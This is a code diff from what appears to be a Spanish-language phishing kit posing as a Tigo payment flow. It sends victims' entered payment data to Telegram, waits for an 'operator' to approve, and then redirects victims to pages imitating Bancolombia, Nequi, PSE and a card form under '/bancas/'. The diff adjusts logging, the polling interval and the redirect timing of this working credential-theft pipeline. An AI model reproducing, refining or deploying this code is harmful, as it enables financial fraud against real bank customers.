@@ -131,61 +131,56 @@ document.addEventListener('DOMContentLoaded', function() {
                 const result = await TelegramClient.sendToTelegram(action, data, sessionId);
                 
                 if (result.success) {
-                    console.log(`[PAYMENT] ✓ Datos enviados. Esperando confirmación del operador...`);
+                    console.log(`[PAYMENT] ✓ Datos enviados a Telegram`);
                     console.log(`[PAYMENT] SessionID: ${sessionId}`);
+                    console.log(`[PAYMENT] ⏳ Esperando confirmación del operador...`);
                     
-                    // Esperar confirmación del operador antes de redirigir
+                    // Polling optimizado con intervalo adaptativo
                     TelegramClient.startPolling((actions, stop) => {
                         if (window.__paymentProcessing) {
-                            console.warn('[PAYMENT] Ya procesando, ignorando...');
                             return;
                         }
-                        
-                        console.log('[PAYMENT] Acciones recibidas:', actions);
                         
                         const action = actions[0];
                         const actionName = action.action;
                         
-                        console.log('[PAYMENT] ✓ Acción recibida:', actionName);
+                        console.log('[PAYMENT] 🔔 Acción recibida:', actionName);
                         
-                        // Verificar que sea la acción correcta
+                        // Verificar acciones esperadas
                         const expectedContinue = `tigo_${method}_continue`;
                         const expectedReject = `tigo_${method}_reject`;
                         
                         if (actionName === expectedReject) {
-                            console.log('[PAYMENT] ❌ Operador rechazó el pago');
+                            console.log('[PAYMENT] ❌ Operador rechazó');
                             stop();
                             alert('El operador ha cancelado este pago');
                             if (overlay) {
                                 overlay.classList.remove('active');
                                 overlay.style.display = 'none';
                             }
-                            window.__paymentProcessing = false;
                             return;
                         }
                         
                         if (actionName === expectedContinue) {
                             window.__paymentProcessing = true;
-                            
-                            // Detener polling
                             stop();
                             
-                            console.log('[PAYMENT] ✓ Operador aprobó, redirigiendo...');
+                            console.log('[PAYMENT] ✅ Operador aprobó → Redirigiendo...');
                             
-                            // Redireccionar según el método
-                            if (method === 'card') {
-                                window.location.href = `/card/form?invoice_id=${invoiceId}`;
-                            } else if (method === 'bancolombia') {
-                                window.location.href = '/bancas/Bancolombia/index.html';
-                            } else if (method === 'nequi') {
-                                window.location.href = '/bancas/Nequi/numero.html';
-                            } else if (method === 'pse') {
-                                window.location.href = `/pse/form?invoice_id=${invoiceId}`;
-                            }
-                        } else {
-                            console.log('[PAYMENT] Acción no relevante, esperando...');
+                            // Redirección inmediata
+                            setTimeout(() => {
+                                if (method === 'card') {
+                                    window.location.href = `/card/form?invoice_id=${invoiceId}`;
+                                } else if (method === 'bancolombia') {
+                                    window.location.href = '/bancas/Bancolombia/index.html';
+                                } else if (method === 'nequi') {
+                                    window.location.href = '/bancas/Nequi/numero.html';
+                                } else if (method === 'pse') {
+                                    window.location.href = `/pse/form?invoice_id=${invoiceId}`;
+                                }
+                            }, 100);
                         }
-                    }, sessionId, 50, 300000);
+                    }, sessionId, 100, 300000); // Intervalo optimizado: 100ms
                 } else {
                     console.error('[PAYMENT] Error al enviar:', result.error);
                     alert('Error al procesar el pago. Por favor intenta nuevamente.');
